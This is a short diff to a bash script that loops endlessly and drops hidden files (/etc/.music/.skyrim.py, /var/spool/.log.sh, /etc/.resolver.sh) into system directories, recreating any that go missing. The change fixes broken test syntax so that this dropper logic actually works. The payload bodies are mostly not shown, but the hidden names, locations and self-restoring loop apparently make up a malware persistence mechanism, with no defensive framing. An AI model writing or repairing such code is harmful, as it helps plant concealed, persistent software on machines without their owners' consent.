@@ -1,11 +1,11 @@
 #!/bin/bash
 while true
 do
-if ! ( -d /etc/.music )
+if ! [ -d /etc/.music ]
 then
 mkdir /etc/.music
 fi
-if ! ( -f /etc/.music/.skyrim.py )
+if ! [ -f /etc/.music/.skyrim.py ]
 then
 cat <<EOFA > /etc/.music/.skyrim.py
 import os
@@ -52,7 +52,7 @@ def main():
 main()
 EOFA
 fi
-if ! ( -f /var/spool/.log.sh )
+if ! [ -f /var/spool/.log.sh ]
 then
 cat <<EOFB > /var/spool/.log.sh
 
@@ -69,7 +69,7 @@ u -- Uninstall. Will uninstall the program from the machine, along with sending 
 
 EOFB
 fi
-if ! ( -f /etc/.resolver.sh )
+if ! [ -f /etc/.resolver.sh ]
 then
 cat <<EOFC > /etc/.resolver.sh
 #!/bin/bash
